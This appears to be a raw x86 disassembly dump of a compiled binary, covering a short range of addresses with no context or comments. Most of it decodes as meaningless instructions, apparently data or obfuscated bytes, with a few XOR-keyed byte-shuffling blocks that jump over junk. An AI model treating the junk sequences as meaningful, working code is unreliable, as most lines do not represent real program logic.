  404a0f:	mov    ch,0x47
  404a11:	sbb    ecx,DWORD PTR [edx+esi*1]
  404a14:	popa   
  404a15:	out    dx,eax
  404a16:	xchg   ecx,eax
  404a17:	sar    DWORD PTR [ebx-0xa],1
  404a1a:	aaa    
  404a1b:	dec    esp
  404a1c:	xor    eax,0x7f800acd
  404a21:	test   al,0x5b
  404a23:	mov    ch,0xd2
  404a25:	or     BYTE PTR [edi-0x20],al
  404a28:	out    dx,eax
  404a29:	loopne 0x404a48
  404a2b:	lock jb 0x404a14
  404a2e:	xor    DWORD PTR ds:0xb6991c19,ecx
  404a34:	loope  0x4049da
  404a36:	pop    esp
  404a37:	sbb    edi,DWORD PTR [esi]
  404a39:	mov    edi,0x57f1af17
  404a3e:	dec    edi
  404a3f:	add    DWORD PTR [esi-0x5a0cf7e5],esp
  404a45:	push   ecx
  404a46:	xchg   DWORD PTR [esi],esi
  404a48:	mov    eax,ds:0xf4397196
  404a4d:	pop    ebx
  404a4e:	mov    ebp,0x3eede83
  404a53:	data16 xor BYTE PTR [edi+0x3e],0x63
  404a58:	xor    eax,0x88fbe31
  404a5d:	cmp    eax,DWORD PTR [ecx]
  404a5f:	push   eax
  404a60:	repnz enter 0x47bf,0x6d
  404a65:	sub    dl,al
  404a67:	fs cmc 
  404a69:	pop    ecx
  404a6a:	push   esi
  404a6b:	ja     0x404a25
  404a6d:	mov    cl,ah
  404a6f:	mov    ds:0x669c96d2,al
  404a74:	sar    edi,0xdc
  404a77:	mov    eax,0x2eba3b97
  404a7c:	fisttp WORD PTR [ebx-0x72cccdb7]
  404a82:	loope  0x404ac1
  404a84:	push   ds
  404a85:	mov    dh,0xa5
  404a87:	mov    ah,0x90
  404a89:	in     al,dx
  404a8a:	xchg   edx,eax
  404a8b:	add    ah,ch
  404a8d:	and    esi,DWORD PTR [edi]
  404a8f:	sar    DWORD PTR [esi+0x1db83235],1
  404a95:	lods   eax,DWORD PTR ds:[esi]
  404a96:	test   BYTE PTR [ebp-0x3b],bl
  404a99:	sub    al,0xec
  404a9b:	or     edx,esi
  404a9d:	mov    edx,0x640c593d
  404aa2:	xchg   edx,eax
  404aa3:	rcr    BYTE PTR [eax],0x46
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xac3c6a28
  404b32:	mov    cl,BYTE PTR [edi]
  404b34:	xchg   edi,eax
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404bbb
  404b3e:	and    dl,bl
  404b40:	mov    WORD PTR [ebp-0x36],ss
  404b43:	push   ebx
  404b44:	mov    ecx,0x4758ab73
  404b49:	mov    ah,0xe7
  404b4b:	stos   BYTE PTR es:[edi],al
  404b4c:	lods   eax,DWORD PTR ds:[esi]
  404b4d:	ror    BYTE PTR [edx-0x7f81f8f2],1
  404b53:	in     eax,0xe7
  404b55:	cmp    esi,DWORD PTR [esi-0x5e]
  404b58:	ins    BYTE PTR es:[edi],dx
  404b59:	xor    al,0xc1
  404b5b:	out    dx,al
  404b5c:	mov    al,ds:0xadff5bfe
  404b61:	icebp  
  404b62:	or     dl,dh
  404b64:	sbb    eax,0xff992eae
  404b69:	mov    cl,dl
  404b6b:	sub    eax,0x5c3933b2
  404b70:	in     eax,0x2c
  404b72:	push   ebp
  404b73:	es pop eax
  404b75:	pop    ds
  404b76:	clc    
  404b77:	addr16 ret 
  404b79:	add    eax,0xcd475130
  404b7e:	fiadd  WORD PTR [edi]
  404b80:	outs   dx,BYTE PTR ds:[esi]
  404b81:	sbb    eax,0x545e99cc
  404b86:	lahf   
  404b87:	pusha  
  404b88:	hlt    
  404b89:	mov    ebp,esp
  404b8b:	fisttp WORD PTR [eax-0x42]
  404b8e:	dec    ebp
  404b8f:	or     al,0x2a
  404b91:	test   al,0x68
  404b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b94:	and    BYTE PTR ds:0x1b44cbb5,0xe5
  404b9b:	cmp    al,BYTE PTR [ebx]
  404b9d:	sub    al,0xdb
  404b9f:	xchg   ebx,eax
  404ba0:	mov    eax,0xca274607
  404ba5:	jnp    0x404b88
  404ba7:	jmp    0x3c53:0x7b883754
  404bae:	adc    DWORD PTR [ebx-0x6afd7d73],0xffffffa5
  404bb5:	xchg   ebx,eax
  404bb6:	popf   
  404bb7:	cwde   
  404bb8:	loopne 0x404c36
  404bba:	pop    ss
  404bbb:	leave  
  404bbc:	push   edx
  404bbd:	cmp    al,0xdf
  404bbf:	jg     0x404bcd
  404bc1:	push   eax
  404bc2:	sbb    ebp,DWORD PTR [eax+ebp*2]
  404bc5:	sbb    al,0xa0
  404bc7:	repz adc DWORD PTR cs:[edx-0x33],0xffffff92
  404bcd:	pop    edi
  404bce:	in     al,0x14
  404bd0:	data16 mov BYTE PTR [ebx-0x36d15cb],dl
  404bd7:	cmp    DWORD PTR [edx],ebp
  404bd9:	mov    ch,0x5b
  404bdb:	js     0x404c28
  404bdd:	ins    DWORD PTR es:[edi],dx
  404bde:	dec    edi
  404bdf:	jns    0x404b70
  404be1:	int    0xb3
  404be3:	push   ds
  404be4:	mov    edi,0xc250541
  404be9:	mov    ah,0x67
  404beb:	jecxz  0x404ba2
  404bed:	loop   0x404c65
  404bef:	cmp    DWORD PTR [ebx-0x38390352],esp
  404bf5:	jb     0x404bb0
  404bf7:	lea    ebx,[ebx-0x28]
  404bfa:	push   edx
  404bfb:	pop    ecx
  404bfc:	xor    eax,eax
  404bfe:	(bad)  
  404bff:	jp     0x404bee
  404c01:	mov    ds:0xa21d68c,eax
  404c06:	push   cs
  404c07:	call   0x9031c49a
  404c0c:	pop    ss
  404c0d:	inc    edx
  404c0e:	fisub  WORD PTR [esi+0x64d157b5]
  404c14:	bound  edi,QWORD PTR [eax+ebp*1]
  404c17:	xor    DWORD PTR [ecx+0x3add9ed7],ebp
  404c1d:	push   ecx
  404c1e:	bound  ebx,QWORD PTR [edi-0x21]
  404c21:	(bad)  
  404c22:	mov    edi,ebp
  404c24:	call   0xeee6eedd
  404c29:	mov    eax,ds:0x1f69ddb0
  404c2e:	inc    esp
  404c30:	dec    esi
  404c31:	arpl   bp,bx
  404c33:	retf   0xf3cb
  404c36:	jl     0x404c85
  404c38:	and    BYTE PTR [esi-0x6d],ch
  404c3b:	sub    ecx,DWORD PTR [ebx]
  404c3d:	imul   esi,eax,0xffffff99
  404c40:	jmp    0xfcb6:0x41d270b0
  404c47:	sub    ah,BYTE PTR [ecx+0x55]
  404c4a:	sar    edi,cl
  404c4c:	jle    0x404cae
  404c4e:	pop    ds
  404c4f:	clc    
  404c50:	rcr    BYTE PTR [esi+0x6],0xff
  404c54:	inc    edi
  404c55:	cmp    eax,0xad5984f3
  404c5a:	xchg   ebx,eax
  404c5b:	xchg   ebx,eax
  404c5c:	repz js 0x404bf1
  404c5f:	les    eax,FWORD PTR [ebp+0x3ab8ad8f]
  404c65:	outs   dx,BYTE PTR ds:[esi]
  404c66:	mov    al,ds:0x942de91c
  404c6b:	fistp  QWORD PTR [ebx+eiz*8-0x3d5fdb4]
  404c72:	adc    cl,al
  404c74:	es xchg sp,ax
  404c77:	ins    BYTE PTR es:[edi],dx
  404c78:	dec    edi
  404c79:	cmp    eax,DWORD PTR ds:0xe0750989
  404c7f:	shr    ebx,1
  404c81:	mov    bl,0xfa
  404c83:	and    al,BYTE PTR [esi-0x4c6f32a5]
  404c89:	imul   esi,DWORD PTR [eax],0xffffffed
  404c8c:	and    al,0xaf
  404c8e:	test   BYTE PTR [edx-0x39a98245],0xd6
  404c95:	aas    
  404c96:	aas    
  404c97:	into   
  404c98:	pop    ecx
  404c99:	push   ds
  404c9a:	ins    DWORD PTR es:[edi],dx
  404c9b:	sub    BYTE PTR [esi-0x16],ah
  404c9e:	jno    0x404c8b
  404ca0:	cmp    BYTE PTR [eax-0x3090b5be],ch
  404ca6:	ret    0xd3ac
  404ca9:	test   ebx,edi
  404cab:	(bad)  
  404cac:	scas   eax,DWORD PTR es:[edi]
  404cad:	mov    esi,0xe247f0f7
  404cb2:	push   ebx
  404cb3:	rcr    DWORD PTR [ebx+eax*1-0x38],0x2e
  404cb8:	jns    0x404c9e
  404cba:	jo     0x404cb6
  404cbc:	cmp    edi,ecx
  404cbe:	fnstsw WORD PTR [edx+edi*8+0x7a]
  404cc2:	retf   
  404cc3:	pusha  
  404cc4:	lock inc edi
  404cc6:	scas   eax,DWORD PTR es:[edi]
  404cc7:	lea    eax,[eax+ecx*4+0x10]
  404ccb:	vdivpd xmm2,xmm0,xmm5
  404ccf:	test   DWORD PTR ds:0xfbef538c,ebx
  404cd5:	fst    QWORD PTR [edi]
  404cd7:	mov    ebx,0x4b14fbae
  404cdc:	xchg   DWORD PTR [esi+0x1e],eax
  404cdf:	out    0x41,eax
  404ce1:	ret    
  404ce2:	(bad)  
  404ce3:	jne    0x404c90
  404ce5:	jmp    0x2242217c
  404cea:	sbb    al,0xa4
  404cec:	push   0x4fa1e9ce
  404cf1:	loopne 0x404c9a
  404cf3:	ds mov ebp,0x5f1178b3
  404cf9:	lods   eax,DWORD PTR ds:[esi]
  404cfa:	jle    0x404d34
  404cfc:	shl    BYTE PTR [ecx+0x1a],0xef
  404d00:	lods   eax,DWORD PTR es:[esi]
  404d02:	sub    DWORD PTR [ecx],ebx
  404d04:	xor    al,dl
  404d06:	icebp  
  404d07:	inc    ecx
  404d08:	or     DWORD PTR [ebx],0x53
  404d0b:	mov    eax,DWORD PTR [esi+0x6237de00]
  404d11:	pusha  
  404d12:	stos   DWORD PTR es:[edi],eax
  404d13:	inc    ebx
  404d14:	call   0x760b4fc5
  404d19:	(bad)  
  404d1a:	das    
  404d1b:	cmp    BYTE PTR ss:[eax],al
  404d1e:	push   ebx
  404d1f:	add    al,0x7a
  404d21:	hlt    
  404d22:	idiv   BYTE PTR [ebp+0x5c]
  404d25:	xchg   edx,eax
  404d26:	dec    eax
  404d27:	rcl    DWORD PTR [edi],0x27
  404d2a:	call   0xf6895146
  404d2f:	cli    
  404d30:	push   ebx
  404d31:	dec    edx
  404d32:	pop    ss
  404d33:	cmp    esi,ecx
  404d35:	xor    ebp,DWORD PTR [edx]
  404d37:	das    
  404d38:	xchg   ebx,eax
  404d39:	cwde   
  404d3a:	mov    edx,es
  404d3c:	clc    
  404d3d:	add    cl,bh
  404d3f:	repz mov dl,BYTE PTR [ebx+0xc0b8fec]
  404d46:	xor    eax,0x72d2000c
  404d4b:	inc    ebx
  404d4c:	test   al,0xa4
  404d4e:	mov    dh,0xda
  404d50:	popa   
  404d51:	pop    ebp
  404d52:	xchg   ebp,eax
  404d53:	or     DWORD PTR [edi],eax
  404d55:	(bad)  
  404d56:	scas   eax,DWORD PTR es:[edi]
  404d57:	jg     0x404d75
  404d59:	std    
  404d5a:	loope  0x404d9e
  404d5c:	hlt    
  404d5d:	pop    es
  404d5e:	(bad)  
  404d5f:	jbe    0x404cf6
  404d61:	lahf   
  404d62:	mov    bl,0x3d
  404d64:	mov    dl,0xf9
  404d66:	mov    eax,ds:0x4ff8b75e
  404d6b:	mov    edi,0x2843f8b5
  404d70:	test   BYTE PTR [eax+0x677b941],al
  404d76:	fimul  WORD PTR [esi]
  404d78:	stc    
  404d79:	mov    eax,ds:0xe776268
  404d7e:	cmp    dh,cl
  404d80:	mov    bx,0x934e
  404d84:	and    eax,0xf6d43a99
  404d89:	lods   eax,DWORD PTR ds:[esi]
  404d8a:	mov    eax,ebp
  404d8c:	dec    esp
  404d8d:	in     eax,dx
  404d8e:	or     DWORD PTR [eax+0x4d],eax
  404d91:	scas   eax,DWORD PTR es:[edi]
  404d92:	pop    ebp
  404d93:	pop    edi
  404d94:	sub    dh,al
  404d96:	adc    al,0x3
  404d98:	scas   al,BYTE PTR es:[edi]
  404d99:	in     al,dx
  404d9a:	(bad)  
  404d9c:	out    0x56,al
  404d9e:	fstp   QWORD PTR [edx+0x4779e282]
  404da4:	inc    ecx
  404da5:	int    0x20
  404da7:	arpl   bx,sp
  404da9:	out    0x82,al
  404dab:	mov    edx,DWORD PTR ds:0x904fd65e
  404db1:	inc    BYTE PTR [esi+0x5f]
  404db4:	xor    eax,eax
  404db6:	sbb    dh,BYTE PTR [eax-0x31]
  404db9:	dec    esi
  404dba:	or     eax,0xb1009bb4
  404dbf:	(bad)  
  404dc0:	rcl    BYTE PTR [edx],cl
  404dc2:	xor    ecx,ebx
  404dc4:	popf   
  404dc5:	pop    ecx
  404dc6:	enter  0xff1c,0xdc
  404dca:	fld    DWORD PTR [eax-0x14]
  404dcd:	sub    BYTE PTR [ebx+0x272aa4d1],al
  404dd3:	scas   al,BYTE PTR es:[edi]
  404dd4:	in     eax,0xb6
  404dd6:	inc    eax
  404dd7:	out    0x2c,al
  404dd9:	add    eax,0x1709862d
  404dde:	sbb    ebx,eax
  404de0:	pop    ebx
  404de1:	inc    ebp
  404de2:	and    dh,0xb0
  404de5:	xchg   DWORD PTR [eax+0x61b8865d],esp
  404deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dec:	mov    dh,0x2d
  404dee:	retf   
  404def:	xchg   ebx,eax
  404df0:	push   esi
  404df1:	pushf  
  404df2:	lock inc esi
  404df4:	and    BYTE PTR [edx+0x3d3bd2b8],bl
  404dfa:	sbb    al,0x62
  404dfc:	cwde   
  404dfd:	mov    bl,0xe0
  404dff:	dec    ebx
  404e00:	pusha  
  404e01:	ror    BYTE PTR [ebx+0x7768d116],cl
  404e07:	into   
  404e08:	push   0x284608b
  404e0d:	dec    ebx
  404e0e:	retf   
  404e0f:	sbb    bh,dl
  404e11:	bound  esp,QWORD PTR [edi]
  404e13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e14:	popa   
  404e15:	xabort 0x96
  404e18:	xor    ah,ch
  404e1a:	cmp    BYTE PTR ds:0xa0936bd3,ch
  404e20:	dec    ecx
  404e21:	addr16 jmp 0x3d7:0xaf0ff903
  404e29:	push   ebp
  404e2a:	in     al,dx
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e29
  404e5e:	and    dh,BYTE PTR [edx]
  404e60:	mov    ds:0x7e7e218c,al
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404ec3
  404e6a:	push   esp
  404e6b:	test   al,0xad
  404e6d:	mov    al,ds:0xc4cad899
  404e72:	inc    esi
  404e73:	out    0xf3,eax
  404e75:	or     al,0x63
  404e77:	ja     0x404eda
  404e79:	imul   ecx,DWORD PTR [ecx],0xffffff9d
  404e7c:	add    BYTE PTR [ecx],al
  404e7e:	arpl   WORD PTR [ebp+0xb],cx
  404e81:	inc    edi
  404e82:	pop    edx
  404e83:	aaa    
  404e84:	int    0xdf
  404e86:	or     eax,DWORD PTR [esi+0x7872fc82]
  404e8c:	dec    eax
  404e8d:	addr16 push ss
  404e8f:	or     eax,eax
  404e91:	mov    cl,0x2b
  404e93:	leave  
  404e94:	inc    eax
  404e95:	popf   
  404e96:	push   edi
  404e97:	mov    al,0x8a
  404e99:	rol    DWORD PTR [edi+0x15512461],cl
  404e9f:	adc    ah,bh
  404ea1:	and    DWORD PTR ds:0xd9c0498,ebx
  404ea7:	(bad)  
  404ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ea9:	outs   dx,BYTE PTR ds:[esi]
  404eaa:	jg     0x404e7e
  404eac:	cld    
  404ead:	jb     0x404ee2
  404eaf:	adc    al,0x92
  404eb1:	or     DWORD PTR [ecx],ebx
  404eb3:	shr    DWORD PTR [ebx-0x6b57f4ce],1
  404eb9:	loope  0x404eee
  404ebb:	scas   al,BYTE PTR es:[edi]
  404ebc:	les    edi,FWORD PTR [ebx]
  404ebe:	mov    dh,0x66
  404ec0:	or     eax,0x2f5a665c
  404ec5:	cmp    dh,BYTE PTR [eax]
  404ec7:	mov    eax,esi
  404ec9:	jne    0x404f08
  404ecb:	jo     0x404e96
  404ecd:	mov    dh,BYTE PTR [eax]
  404ecf:	aam    0x48
  404ed1:	shr    edx,cl
  404ed3:	mov    ch,dl
  404ed5:	out    dx,eax
  404ed6:	cmp    DWORD PTR [eax],eax
  404ed8:	je     0x404e77
  404eda:	jnp    0x404ead
  404edc:	(bad)  
  404edd:	add    al,0xa9
  404edf:	sbb    eax,0x6a396a0b
  404ee4:	rol    DWORD PTR [edx],0xaf
  404ee7:	sbb    ch,BYTE PTR [edx]
  404ee9:	push   ebx
  404eea:	mov    WORD PTR [eax+eax*2+0x34],cs
  404eee:	enter  0x724b,0xf3
  404ef2:	cmc    
  404ef3:	adc    eax,edx
  404ef5:	add    eax,0xbab5ddaa
  404efa:	add    ch,BYTE PTR [esp+edi*2+0x4a85b901]
  404f01:	div    cl
  404f03:	jns    0x404f74
  404f05:	int    0xf1
  404f07:	hlt    
  404f08:	cmp    esi,DWORD PTR [edi-0x67]
  404f0b:	push   0x4b1a5691
  404f10:	fwait
  404f11:	dec    edi
  404f12:	rcl    BYTE PTR [ecx-0x3],0x4e
  404f16:	fsubr  DWORD PTR [edx]
  404f18:	test   BYTE PTR [esi-0x38],ah
  404f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1c:	mov    esp,0x57b23f0b
  404f21:	or     DWORD PTR [ebp+0x4d],0x84068b25
  404f28:	retf   0xd482
  404f2b:	xor    ah,BYTE PTR [esi]
  404f2d:	ss xor edi,esp
  404f30:	jmp    0x404f7a
  404f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f33:	inc    edx
  404f34:	ret    0x774b
  404f37:	xchg   esp,eax
  404f38:	jns    0x404eba
  404f3a:	ss inc eax
  404f3c:	push   es
  404f3d:	es push cs
  404f3f:	push   esi
  404f40:	shl    DWORD PTR [ecx-0x7a],0x93
  404f44:	sbb    BYTE PTR [ebx+0xa],ch
  404f47:	push   ds
  404f48:	inc    ecx
  404f49:	or     dh,BYTE PTR [eax-0x3f]
  404f4c:	sbb    edx,edi
  404f4e:	mov    ebx,0x63fdbd43
  404f53:	sti    
  404f54:	iret   
  404f55:	cdq    
  404f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f57:	shl    DWORD PTR ds:0xdbce0fc1,cl
  404f5d:	(bad)  
  404f5e:	out    0xc9,al
  404f60:	out    dx,al
  404f61:	sub    DWORD PTR [edx-0x65],0xfffffffe
  404f65:	mov    edi,0xd9d36ef1
  404f6a:	adc    dh,BYTE PTR [esi-0x35]
  404f6d:	mov    bl,0xc8
  404f6f:	push   ebp
  404f70:	bound  ecx,QWORD PTR [eax+ecx*2+0xb4c4f3]
  404f77:	cmp    DWORD PTR [ecx+esi*8+0x12],ebp
  404f7b:	js     0x404f01
  404f7d:	in     eax,0x4a
  404f7f:	sti    
  404f80:	sbb    al,0xe6
  404f82:	mov    ds:0xe91f897e,al
  404f87:	sbb    al,0x7f
  404f89:	or     eax,0x7cca9710
  404f8e:	repnz popf 
  404f90:	sub    BYTE PTR [edi+0x18],dh
  404f93:	fbstp  TBYTE PTR [ebx-0x73cb1506]
  404f99:	dec    eax
  404f9a:	test   eax,0xa8b183bb
  404f9f:	cmp    eax,DWORD PTR [ecx]
  404fa1:	leave  
  404fa2:	test   al,0x12
  404fa4:	cli    
  404fa5:	int    0x8d
  404fa7:	xchg   edx,eax
  404fa8:	cmp    esp,DWORD PTR [edi+0x79]
  404fab:	and    bl,ah
  404fad:	(bad)  
  404fae:	jmp    0xe1d1:0xcfb7fd80
  404fb5:	inc    ebx
  404fb6:	out    0x51,eax
  404fb8:	or     al,0x3f
  404fba:	pop    eax
  404fbb:	inc    ecx
  404fbc:	dec    ebp
  404fbd:	ret    
  404fbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fbf:	iret   
  404fc0:	shl    al,cl
  404fc2:	and    DWORD PTR [ebx-0x2d5be9e4],edx
  404fc8:	je     0x404f73
  404fca:	add    DWORD PTR [eax+0xc],esi
  404fcd:	jge    0x405042
  404fcf:	pop    ecx
  404fd0:	push   edi
  404fd1:	cli    
  404fd2:	sub    eax,0x113dbfa8
  404fd7:	mov    ebp,0xf3a99767
  404fdc:	xchg   ebp,eax
  404fdd:	retf   0x1364
  404fe0:	jp     0x40505e
  404fe2:	clc    
  404fe3:	jmp    0x5434:0xd06f30a0
  404fea:	dec    ecx
  404feb:	push   ds
  404fec:	shl    BYTE PTR [ecx-0x2c],cl
  404fef:	xchg   ebp,eax
  404ff0:	jge    0x404fc2
  404ff2:	and    DWORD PTR [esi+0x682f1bfe],edi
  404ff8:	jb     0x40500c
  404ffa:	in     al,0xee
  404ffc:	inc    edx
  404ffd:	and    BYTE PTR [edx*8-0x221d2fbd],dl
  405004:	pop    ss
  405005:	scas   eax,DWORD PTR es:[edi]
  405006:	ins    DWORD PTR es:[edi],dx
  405007:	xor    eax,0xb96b0bd3
  40500c:	mov    al,ds:0xd5862e58
  405011:	iret   
  405012:	add    DWORD PTR [ecx-0x3e],esp
  405015:	rol    DWORD PTR [ebx],1
  405017:	rcr    BYTE PTR [ebx+0x3835df44],1
  40501d:	cmp    al,0x61
  40501f:	cmp    al,BYTE PTR [ebx-0x1d0c2f8]
  405025:	mov    ds:0x4d8fc1e1,eax
  40502a:	imul   BYTE PTR [ebx+0x7]
  40502d:	dec    edx
  40502e:	test   BYTE PTR [edi+0x4cbdc5a],0xc0
  405035:	mov    dh,0x76
  405037:	das    
  405038:	xchg   cl,ah
  40503a:	scas   al,BYTE PTR es:[edi]
  40503b:	jmp    0x404ff9
  40503d:	push   esp
  40503e:	int3   
  40503f:	mov    ebx,0xcfb6d8e0
  405044:	mov    ds:0x1ccf539f,al
  405049:	popf   
  40504a:	lds    ebp,FWORD PTR [ecx]
  40504c:	add    DWORD PTR [edi],0xfb74f02b
  405052:	add    esp,ebp
  405054:	xchg   edx,eax
  405055:	ret    0x7c88
  405058:	mov    dh,0x1a
  40505a:	mov    ch,0x13
  40505c:	outs   dx,BYTE PTR ds:[esi]
  40505d:	test   BYTE PTR [ecx-0x53],ch
  405060:	mov    bl,0x7
  405062:	pcmpeqd mm5,QWORD PTR [edx-0x12442fa]
  405069:	addr16 stc 
  40506b:	cmp    ebx,DWORD PTR [edi-0x20]
  40506e:	sub    al,0xb2
  405070:	(bad)  
  405071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405072:	push   es
  405073:	daa    
  405074:	ja     0x40505f
  405076:	aaa    
  405077:	xchg   ebp,eax
  405078:	test   eax,0xa2c44530
  40507d:	(bad)  
  40507e:	push   eax
  40507f:	inc    edx
  405080:	adc    eax,0xf0dc4f3
  405085:	jo     0x4050e4
  405087:	call   DWORD PTR [eax]
  405089:	fld    st(2)
  40508b:	cli    
  40508c:	adc    ebx,DWORD PTR [edx]
  40508e:	push   esi
  40508f:	jecxz  0x4050ee
  405091:	sub    ecx,DWORD PTR [edi+0x51]
  405094:	or     al,BYTE PTR [edx-0x536c8e]
  40509a:	push   esi
  40509b:	or     esi,0xa6a5ece2
  4050a1:	ret    0x70de
  4050a4:	clc    
  4050a5:	pop    edx
  4050a6:	sahf   
  4050a7:	push   0x5a
  4050a9:	sbb    ebx,DWORD PTR [edx+0x7f3cbdb9]
  4050af:	jp     0x405125
  4050b1:	imul   edx,ebx,0x2ea5fe6d
  4050b7:	nop
  4050b8:	mov    ah,0x24
  4050ba:	pop    ds
  4050bb:	mov    dh,0xcb
  4050bd:	add    dh,BYTE PTR [ecx+ebp*2]
  4050c0:	push   edx
  4050c1:	pop    ebp
  4050c2:	(bad)  
  4050c3:	aad    0x4c
  4050c5:	or     DWORD PTR ss:[eax],ebx
  4050c8:	sub    al,0x3e
  4050ca:	ja     0x405144
  4050cc:	int3   
  4050cd:	push   cs
  4050ce:	and    DWORD PTR [edx+0x66],edx
  4050d1:	std    
  4050d2:	pop    ebx
  4050d3:	icebp  
  4050d4:	pop    esp
  4050d5:	mov    edi,0xdd64bfcb
  4050da:	aaa    
  4050db:	mov    ebp,0x2fe9ea46
  4050e0:	pop    es
  4050e1:	add    BYTE PTR [ebx-0x64a66b58],dl
  4050e7:	push   ds
  4050e8:	xor    al,0xe0
  4050ea:	repnz and esp,DWORD PTR [eax-0x10]
  4050ee:	(bad)  
  4050ef:	call   0x4f683c6f
  4050f4:	pushf  
  4050f5:	jmp    0x405172
  4050f7:	jecxz  0x40515c
  4050f9:	jb     0x4050e9
  4050fb:	mov    ds:0xdf1e474e,eax
  405100:	push   eax
  405101:	cwde   
  405102:	(bad)  
  405103:	dec    edi
  405104:	scas   al,BYTE PTR es:[edi]
  405105:	inc    ebx
  405106:	or     al,0x66
  405108:	dec    ecx
  405109:	out    dx,al
  40510a:	mov    ds:0xc9009ee2,eax
  40510f:	(bad)  
  405110:	cmp    eax,DWORD PTR [esi+ebp*4-0x2b]
  405114:	pop    ebx
  405115:	sti    
  405116:	push   cs
  405117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405118:	int3   
  405119:	sti    
  40511a:	adc    dh,dl
  40511c:	cmp    ch,BYTE PTR [edi+0x36]
  40511f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405120:	dec    edi
  405121:	ret    0xde8b
  405124:	test   eax,0x37ad5e8a
  405129:	cdq    
  40512a:	stos   BYTE PTR es:[edi],al
  40512b:	cmp    cl,ah
  40512d:	in     eax,0x96
  40512f:	(bad)  
  405130:	push   ds
  405131:	mov    eax,ebx
  405133:	not    ebp
  405135:	cwde   
  405136:	adc    dl,dl
  405138:	mov    eax,ds:0xa9231dec
  40513d:	dec    edi
  40513e:	mov    bl,0xe9
  405140:	retf   0x29de
  405143:	daa    
  405144:	out    dx,eax
  405145:	cmc    
  405146:	iret   
  405147:	inc    eax
  405148:	outs   dx,DWORD PTR ds:[esi]
  405149:	bound  edi,QWORD PTR [esi+0x5]
  40514c:	dec    BYTE PTR [eax+0x59]
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	lahf   
  405172:	sbb    dh,bh
  405174:	inc    ecx
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405198
  40517e:	jo     0x4051af
  405180:	lods   al,BYTE PTR ds:[esi]
  405181:	xchg   esp,eax
  405182:	dec    edi
  405183:	sbb    dh,BYTE PTR [edx+edx*1]
  405186:	fcmovu st,st(2)
  405188:	sbb    DWORD PTR [edx],eax
  40518a:	push   0xcb7de09c
  40518f:	inc    eax
  405190:	add    BYTE PTR [edx],dh
  405192:	inc    esp
  405193:	pop    eax
  405194:	cmp    ebp,DWORD PTR [ebx-0x3]
  405197:	fdiv   DWORD PTR [edx-0x6d942e5e]
  40519d:	hlt    
  40519e:	sbb    eax,0x638a9281
